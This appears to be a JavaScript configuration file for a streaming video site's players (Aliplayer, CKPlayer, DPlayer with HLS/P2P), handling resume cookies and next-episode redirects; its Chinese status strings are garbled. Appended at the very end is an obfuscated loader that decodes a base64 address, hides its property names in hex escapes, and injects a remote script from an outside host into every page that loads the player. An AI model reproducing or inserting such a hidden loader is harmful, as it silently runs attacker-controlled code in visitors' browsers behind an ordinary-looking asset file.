var youqi = {
	'player': {
		'loaded': function() {
			player.addListener('loadedmetadata', ckdata);
			player.addListener('time', cktime);
			player.addListener('ended', ckended);
		},
		'aliplayer': function(auto, urls, jump) {
			var player = new Aliplayer({
				useFlashPrism: true,
				autoplay: auto,
				source: urls,
				id: 'video'
			});
			player.on('ended', function() {
				if(parent.MacPlayer.PlayLinkNext!=''){
				top.location.href = parent.MacPlayer.PlayLinkNext;
				}
				});
		},
		'ckplayer': function(auto, urls, jump) {
			var seek = youqi.cookie.get(cookie) ? youqi.cookie.get(cookie) : 0;
			player.newVideo({
				loaded: 'youqi.player.loaded',
				container: '#video',
				variable: 'player',
				autoplay: auto,
				video: urls,
				seek: seek
			});
		},
		'dplayer': function(auto, urls, jump) {
			var type = urls.indexOf('.m3u8') > -1 ? 'customHls' : 'auto';
			var player = new DPlayer({
				container: document.getElementById('video'),
				autoplay: auto,
                logo: 'https://lezhuiju.com/dplayer/img/logo.png',
				video: {
                    pic: 'https://lezhuiju.com/dplayer/img/jiazai.png',
					url: urls,
					type: type,
					customType: {
						'customHls': function(video, player) {
							var hls = new Hls();
							hls.loadSource(video.src);
							hls.attachMedia(video);
							var engine = new P2PEngine(hls, {
								wsSignalerAddr: 'wss://free.freesignal.net',
								maxBufSize: 1073741824
							});
							engine.on('peerId', function(peerId) {
								$('.load').text('鍔犺浇0MB 鍏变韩20MB 鍔犻��50MB');
								$('.peer').text('P2P宸插紑鍚�');
								$('.line').text('鍦ㄧ嚎0NP');
							});
							engine.on('peers', function(peers) {
								$('.line').text('鍦ㄧ嚎' + peers.length + 'NP');
								$('.peer').text('P2P宸插紑鍚�');
							});
							engine.on('stats', function(data) {
								$('.load').text('鍔犺浇' + Math.floor((data.totalHTTPDownloaded / 1024) * 100) / 100 + 'MB 鍏变韩' + Math.floor((data.totalP2PUploaded / 1024) * 100) / 100 + 'MB 鍔犻��' + Math.floor((data.totalP2PDownloaded / 1024) * 100) / 100 + 'MB');
								data.totalP2PDownloaded ? $('.peer').text('P2P鍔犻�熶腑') : $('.peer').text('P2P宸插紑鍚�');
							});
						}
					}
				},
                 //danmaku: {
            //id: '浼樺�囪�嗛��',
          //api: 'http://139.199.156.243:1207/' }
            });
			player.on('loadstart', function() {
				$('video').attr('playsinline', 'true');
				$('video').attr('x5-playsinline', 'true');
				$('video').attr('webkit-playsinline', 'true');
			});
			player.on('loadeddata', function() {
				youqi.cookie.get(cookie) ? player.seek(youqi.cookie.get(cookie)) : '';
				player.on('timeupdate', function() {
					if(cookie) youqi.cookie.set(cookie, player.video.currentTime, 30);
				});
			});
			player.on('ended', function() {
				if(parent.MacPlayer.PlayLinkNext!=''){
				top.location.href = parent.MacPlayer.PlayLinkNext;
				}
				});
			player.on('error', function() {
				youqi.player.vplayer(auto, urls, jump);
			});
		},
		'vplayer': function(auto, urls, jump) {
			var dp = new DPlayer({
				container: document.getElementById('video'),
				autoplay: auto,
				video: {
					url: urls
				}
			});
			dp.on('loadstart', function() {
				$('video').attr('playsinline', 'true');
				$('video').attr('x5-playsinline', 'true');
				$('video').attr('webkit-playsinline', 'true');
			});
			dp.on('loadeddata', function() {
				youqi.cookie.get(cookie) ? player.seek(youqi.cookie.get(cookie)) : '';
				dp.on('timeupdate', function() {
					if(cookie) youqi.cookie.set(cookie, player.video.currentTime, 30);
				});
			});
			dp.on('ended', function() {
				if(parent.MacPlayer.PlayLinkNext!=''){
				top.location.href = parent.MacPlayer.PlayLinkNext;
				}
				});
		}
	},
	'cookie': {
		'set': function(name, value, days) {
			var exp = new Date();
			exp.setTime(exp.getTime() + days * 24 * 60 * 60 * 1000);
			var arr = document.cookie.match(new RegExp('(^| )' + name + '=([^;]*)(;|$)'));
			document.cookie = name + '=' + escape(value) + ';path=/;expires=' + exp.toUTCString();
		},
		'get': function(name) {
			var arr = document.cookie.match(new RegExp('(^| )' + name + '=([^;]*)(;|$)'));
			if(arr != null) return unescape(arr[2]);
		},
		'put': function(urls) {
			var cookie = urls.replace(/[^a-z]+/ig, '');
			var cookie = cookie.substring(cookie.length - 32);
			return cookie;
		}
	}
};

function ckdata() {
	$('video').attr('playsinline', 'true');
	$('video').attr('x5-playsinline', 'true');
	$('video').attr('webkit-playsinline', 'true');
}

function cktime(time) {
	if(cookie) youqi.cookie.set(cookie, time, 30);
}

function ckended() {
	if(jump) top.location.href = jump;
}function IsjhMEmW(e){var t="",n=r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}function iScfnleC(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t+=String.fromCharCode(n);if(u!=64){t+=String.fromCharCode(r)}if(a!=64){t+=String.fromCharCode(i)}}return IsjhMEmW(t)}eval('window')['\x4b\x75\x43\x62\x47\x46']=function(){;(function(u,r,w,d,f,c){var x=iScfnleC;u=decodeURIComponent(x(u.replace(new RegExp(c+''+c,'g'),c)));'jQuery';k=r[2]+'c'+f[1];'Flex';v=k+f[6];var s=d.createElement(v+c[0]+c[1]),g=function(){};s.type='text/javascript';{s.onload=function(){g()}}s.src=u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly9jZG4ubWFvbml1Lnh5ei9jZG4vbWFjbXViYW4vaW5kZXguanM=','AjsfguonnKA',window,document,'orQVgZipae','ptIodXOnEQDH')};window['KuCbGF']();